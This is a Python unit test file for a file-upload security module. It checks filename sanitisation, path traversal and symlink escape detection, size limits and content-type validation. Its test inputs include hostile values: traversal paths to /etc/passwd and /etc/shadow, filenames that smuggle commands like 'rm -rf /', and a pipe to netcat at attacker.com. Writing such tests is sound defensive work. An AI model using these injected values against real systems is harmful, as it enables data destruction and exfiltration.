"""
Unit tests for security module.

This module provides comprehensive tests for file upload security functions,
including path traversal prevention, file size enforcement, content validation,
and secure filename sanitization.
"""
from __future__ import annotations

import os
import tempfile
import unittest
from pathlib import Path
from unittest.mock import MagicMock, patch

import pytest

# Import the security module
from backend_logic.utils.security import (
    ALLOWED_EXTENSIONS,
    ALLOWED_MIME_TYPES,
    MAX_FILE_SIZE,
    create_secure_temp_file,
    get_safe_upload_path,
    sanitize_path_component,
    secure_filename,
    validate_file_content,
    validate_file_path,
    validate_file_size,
    validate_total_upload_size,
)


class TestSecureFilename(unittest.TestCase):
    """Test cases for secure_filename function."""

    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are sanitized."""
        # Various path traversal attempts
        dangerous_names = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../etc/shadow",
            "../uploads/../../etc/passwd",
            "..%2F..%2F..%2Fetc%2Fpasswd",
        ]
        
        for dangerous_name in dangerous_names:
            safe_name = secure_filename(dangerous_name)
            # Should not contain any path traversal components
            self.assertNotIn("..", safe_name)
            self.assertNotIn("/", safe_name)
            self.assertNotIn("\\", safe_name)
            # Should contain a timestamp hash
            self.assertRegex(safe_name, r".*_[a-f0-9]{8}.*")
    
    def test_command_injection_prevention(self):
        """Test that command injection characters are sanitized."""
        dangerous_names = [
            "file; rm -rf /",
            "file`cat /etc/passwd`",
            "file$(whoami).txt",
            "file&& cat /etc/passwd",
            "file| nc attacker.com 1234",
            "file'; DROP TABLE users; --",
        ]
        
        for dangerous_name in dangerous_names:
            safe_name = secure_filename(dangerous_name)
            # Should not contain command injection characters
            self.assertNotIn(";", safe_name)
            self.assertNotIn("`", safe_name)
            self.assertNotIn("$", safe_name)
            self.assertNotIn("&", safe_name)
            self.assertNotIn("|", safe_name)
            self.assertNotIn("'", safe_name)
            self.assertNotIn('"', safe_name)
    
    def test_hidden_file_prevention(self):
        """Test that hidden files are prevented."""
        hidden_files = [
            ".htaccess",
            ".env",
            ".git/config",
            "...hidden",
        ]
        
        for hidden_file in hidden_files:
            safe_name = secure_filename(hidden_file)
            # Should not start with a dot
            self.assertFalse(safe_name.startswith("."))
    
    def test_valid_filename_preservation(self):
        """Test that valid filenames are preserved (with timestamp)."""
        valid_names = [
            "document.pdf",
            "legal-brief.docx",
            "intake_form_2025.txt",
            "evidence-photo.jpg",
        ]
        
        for valid_name in valid_names:
            safe_name = secure_filename(valid_name)
            # Should preserve the extension
            original_ext = Path(valid_name).suffix
            self.assertTrue(safe_name.endswith(original_ext.lower()))
            # Should add timestamp hash
            self.assertRegex(safe_name, r".*_[a-f0-9]{8}.*")
    
    def test_empty_filename_handling(self):
        """Test handling of empty or None filenames."""
        self.assertRegex(secure_filename(""), r"^unnamed_[a-f0-9]{8}$")
        self.assertRegex(secure_filename(None), r"^unnamed_[a-f0-9]{8}$")
        self.assertRegex(secure_filename("   "), r"^file_[a-f0-9]{8}$")
    
    def test_long_filename_truncation(self):
        """Test that very long filenames are truncated."""
        long_name = "a" * 200 + ".pdf"
        safe_name = secure_filename(long_name)
        # Total length should be reasonable (under 120 chars)
        self.assertLessEqual(len(safe_name), 120)
        # Should still have .pdf extension
        self.assertTrue(safe_name.endswith(".pdf"))


class TestFileValidation(unittest.TestCase):
    """Test cases for file validation functions."""
    
    def test_file_size_validation_success(self):
        """Test successful file size validation."""
        # Small file should pass
        small_file = b"x" * 1024  # 1KB
        validate_file_size(small_file)  # Should not raise
        
        # File at limit should pass
        file_at_limit = b"x" * (MAX_FILE_SIZE - 1)
        validate_file_size(file_at_limit)  # Should not raise
    
    def test_file_size_validation_failure(self):
        """Test file size validation failures."""
        # File exceeding limit should fail
        large_file = b"x" * (MAX_FILE_SIZE + 1)
        with self.assertRaises(ValueError) as cm:
            validate_file_size(large_file)
        self.assertIn("exceeds maximum allowed size", str(cm.exception))
        
        # Empty file should fail
        empty_file = b""
        with self.assertRaises(ValueError) as cm:
            validate_file_size(empty_file)
        self.assertIn("Empty files are not allowed", str(cm.exception))
    
    def test_custom_size_limit(self):
        """Test custom size limit validation."""
        file_data = b"x" * 2048  # 2KB
        
        # Should pass with 3KB limit
        validate_file_size(file_data, max_size=3072)
        
        # Should fail with 1KB limit
        with self.assertRaises(ValueError):
            validate_file_size(file_data, max_size=1024)
    
    @patch("backend_logic.utils.security.magic")
    def test_content_validation_success(self, mock_magic):
        """Test successful content validation."""
        # Mock magic to return PDF mime type
        mock_magic.from_buffer.return_value = "application/pdf"
        
        # PDF file with correct extension
        pdf_data = b"%PDF-1.4..."  # Fake PDF header
        mime_type, ext = validate_file_content(pdf_data, "document.pdf")
        
        self.assertEqual(mime_type, "application/pdf")
        self.assertEqual(ext, ".pdf")
    
    @patch("backend_logic.utils.security.magic")
    def test_content_validation_extension_mismatch(self, mock_magic):
        """Test content validation with extension mismatch."""
        # Mock magic to return PDF mime type
        mock_magic.from_buffer.return_value = "application/pdf"
        
        # PDF content but .txt extension
        pdf_data = b"%PDF-1.4..."
        with self.assertRaises(ValueError) as cm:
            validate_file_content(pdf_data, "document.txt")
        self.assertIn("does not match detected content type", str(cm.exception))
    
    @patch("backend_logic.utils.security.magic")
    def test_content_validation_forbidden_type(self, mock_magic):
        """Test content validation with forbidden file type."""
        # Mock magic to return executable mime type
        mock_magic.from_buffer.return_value = "application/x-executable"
        
        exe_data = b"MZ\x90\x00..."  # Fake EXE header
        with self.assertRaises(ValueError) as cm:
            validate_file_content(exe_data, "malware.exe")
        self.assertIn("is not allowed", str(cm.exception))
    
    @patch("backend_logic.utils.security.magic")
    def test_content_validation_disguised_file(self, mock_magic):
        """Test detection of disguised files (e.g., EXE renamed to PDF)."""
        # Mock magic to detect executable despite .pdf extension
        mock_magic.from_buffer.return_value = "application/x-executable"
        
        exe_data = b"MZ\x90\x00..."  # EXE header
        with self.assertRaises(ValueError) as cm:
            validate_file_content(exe_data, "totally_not_malware.pdf")
        self.assertIn("not allowed", str(cm.exception))
    
    def test_total_upload_size_validation(self):
        """Test total upload size validation."""
        # Under limit should pass
        validate_total_upload_size(50 * 1024 * 1024)  # 50MB
        
        # Over limit should fail
        with self.assertRaises(ValueError) as cm:
            validate_total_upload_size(150 * 1024 * 1024)  # 150MB
        self.assertIn("Total upload size", str(cm.exception))


class TestPathSecurity(unittest.TestCase):
    """Test cases for path security functions."""
    
    def test_validate_file_path_success(self):
        """Test successful path validation."""
        base_dir = "/app/uploads"
        
        # Valid paths within base directory
        valid_paths = [
            "/app/uploads/file.pdf",
            "/app/uploads/subfolder/document.docx",
            "/app/uploads/deep/nested/folder/file.txt",
        ]
        
        for path in valid_paths:
            self.assertTrue(validate_file_path(path, base_dir))
    
    def test_validate_file_path_traversal(self):
        """Test path traversal detection."""
        base_dir = "/app/uploads"
        
        # Path traversal attempts
        traversal_paths = [
            "/app/uploads/../../../etc/passwd",
            "/app/uploads/subfolder/../../etc/shadow",
            "/app/../etc/passwd",
            "../../../etc/passwd",
        ]
        
        for path in traversal_paths:
            self.assertFalse(validate_file_path(path, base_dir))
    
    def test_validate_file_path_symlink_escape(self):
        """Test symlink escape detection."""
        with tempfile.TemporaryDirectory() as tmpdir:
            base_dir = Path(tmpdir) / "uploads"
            base_dir.mkdir()
            
            # Create a symlink pointing outside
            outside_dir = Path(tmpdir) / "outside"
            outside_dir.mkdir()
            symlink = base_dir / "escape"
            symlink.symlink_to(outside_dir)
            
            # Path through symlink should be detected as invalid
            escape_path = str(symlink / "secret.txt")
            self.assertFalse(validate_file_path(escape_path, str(base_dir)))
    
    def test_sanitize_path_component(self):
        """Test path component sanitization."""
        # Dangerous components
        dangerous = [
            "../etc",
            "..\\windows",
            "file/../../etc",
            "file\\..\\..\\windows",
        ]
        
        for component in dangerous:
            sanitized = sanitize_path_component(component)
            self.assertNotIn("/", sanitized)
            self.assertNotIn("\\", sanitized)
            self.assertNotIn("..", sanitized)
    
    def test_get_safe_upload_path(self):
        """Test safe upload path generation."""
        base_dir = "/app/uploads"
        
        # Normal case
        path = get_safe_upload_path(base_dir, "document.pdf")
        self.assertTrue(path.startswith(base_dir))
        self.assertRegex(path, r".*document_[a-f0-9]{8}\.pdf$")
        
        # With subfolder
        path = get_safe_upload_path(base_dir, "document.pdf", "client_docs")
        self.assertIn("client_docs", path)
        
        # Dangerous filename should be sanitized
        path = get_safe_upload_path(base_dir, "../../../etc/passwd")
        self.assertTrue(path.startswith(base_dir))
        self.assertNotIn("..", path)


class TestSecureTempFile(unittest.TestCase):
    """Test cases for secure temporary file creation."""
    
    @patch("backend_logic.utils.security.magic")
    def test_create_secure_temp_file(self, mock_magic):
        """Test secure temporary file creation."""
        # Mock magic to return PDF mime type
        mock_magic.from_buffer.return_value = "application/pdf"
        
        # Create a secure temp file
        file_data = b"PDF content here"
        temp_path = create_secure_temp_file(file_data, "test.pdf")
        
        try:
            # File should exist
            self.assertTrue(os.path.exists(temp_path))
            
            # File should contain the data
            with open(temp_path, "rb") as f:
                self.assertEqual(f.read(), file_data)
            
            # File should have restrictive permissions (owner only)
            stat_info = os.stat(temp_path)
            permissions = stat_info.st_mode & 0o777
            self.assertEqual(permissions, 0o600)
            
        finally:
            # Clean up
            if os.path.exists(temp_path):
                os.remove(temp_path)
    
    @patch("backend_logic.utils.security.magic")
    def test_create_secure_temp_file_validation_failure(self, mock_magic):
        """Test that temp file creation fails with invalid content."""
        # Mock magic to return executable mime type
        mock_magic.from_buffer.return_value = "application/x-executable"
        
        # Try to create temp file with executable content
        exe_data = b"MZ\x90\x00..."
        with self.assertRaises(ValueError) as cm:
            create_secure_temp_file(exe_data, "malware.pdf")
        self.assertIn("not allowed", str(cm.exception))


class TestIntegration(unittest.TestCase):
    """Integration tests for security functions working together."""
    
    @patch("backend_logic.utils.security.magic")
    def test_complete_upload_security_flow(self, mock_magic):
        """Test complete secure upload flow."""
        # Mock magic to return PDF mime type
        mock_magic.from_buffer.return_value = "application/pdf"
        
        # Simulate a file upload
        original_filename = "../uploads/../../etc/passwd"
        file_data = b"PDF content" * 1000  # ~11KB
        
        # Step 1: Sanitize filename
        safe_filename = secure_filename(original_filename)
        self.assertNotIn("..", safe_filename)
        
        # Step 2: Validate file size
        validate_file_size(file_data)  # Should not raise
        
        # Step 3: Validate content
        mime_type, ext = validate_file_content(file_data, safe_filename)
        self.assertEqual(mime_type, "application/pdf")
        
        # Step 4: Get safe upload path
        base_dir = "/app/uploads"
        safe_path = get_safe_upload_path(base_dir, safe_filename, "client_123")
        self.assertTrue(safe_path.startswith(base_dir))
        self.assertIn("client_123", safe_path)
        
        # Step 5: Validate final path
        self.assertTrue(validate_file_path(safe_path, base_dir))


if __name__ == "__main__":
    unittest.main()
